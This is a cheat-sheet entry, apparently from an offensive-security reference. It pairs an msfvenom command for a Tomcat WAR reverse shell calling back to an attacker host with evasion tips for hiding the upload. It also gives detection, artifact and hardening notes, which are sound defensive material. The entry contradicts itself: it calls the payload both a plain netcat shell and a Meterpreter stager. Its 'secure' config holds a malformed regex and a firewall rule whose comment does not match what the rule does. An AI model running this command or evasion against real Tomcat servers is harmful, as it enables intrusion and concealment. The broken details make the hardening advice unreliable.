name: Tomcat - msfvenom WAR Reverse Shell
command: msfvenom -p java/jsp_shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f war > backup.war
description: Generates a JSP reverse-shell WAR to deploy via Manager; catch the callback with a netcat listener for an interactive shell.

defense.why_it_works: msfvenom generates a WAR wrapping a JSP Meterpreter stager. Deployed via Tomcat Manager, requesting the JSP connects back to the Metasploit handler delivering a full interactive session.
defense.prerequisites: Valid Tomcat Manager credentials. Network connectivity from Tomcat server to Metasploit listener.
defense.impact: Full Meterpreter session: hashdump, network pivoting, keylogging, filesystem access -- all from the Tomcat process context.
defense.detection: WAR deployment to Tomcat Manager. Outbound TCP from Tomcat process to attacker IP. Unusual Java process spawning child processes. EDR: Meterpreter beacon pattern.
defense.artifacts: Tomcat manager access log (WAR upload) | Network flow: java -> attacker IP on high port | EDR/AV: Meterpreter staging payload | Process tree: java -> meterpreter
defense.prevention: Lock down Tomcat Manager (localhost-only, strong credentials). Egress firewall rules from web server denying non-HTTP outbound. Deploy EDR on the server. Network segmentation to prevent reverse connections.
defense.misconfiguration: Tomcat Manager accessible from internet with weak credentials. No egress filtering. No EDR on Tomcat host.
defense.vulnerable_config:
# Tomcat -- manager app accessible from any IP
# conf/context.xml -- Valve removed or allows all
<!-- Valve className="org.apache.catalina.valves.RemoteAddrValve" allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1" /> -->
# Commented out = manager accessible from 0.0.0.0/0

# conf/tomcat-users.xml -- manager-gui role assigned
<role rolename="manager-script"/>
<user username="tomcat" password="tomcat" roles="manager-script"/>

# OS -- no egress filter, outbound TCP unrestricted
defense.secure_config:
# Tomcat -- restrict manager to localhost only
# conf/context.xml
<Context>
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|10\.0\.0\.0/8"/>
</Context>

# conf/tomcat-users.xml -- strong credentials, minimal roles
<role rolename="manager-script"/>
<user username="deploy_svc" password="Str0ng!R4nd0mP4ss" roles="manager-script"/>

# iptables -- restrict outbound from Tomcat process
iptables -A OUTPUT -m owner --uid-owner tomcat -j DROP  # block all outbound except approved
defense.evasion: Undeploy the malicious WAR after getting a shell; name it innocuously; manager access over a valid session looks like admin activity.
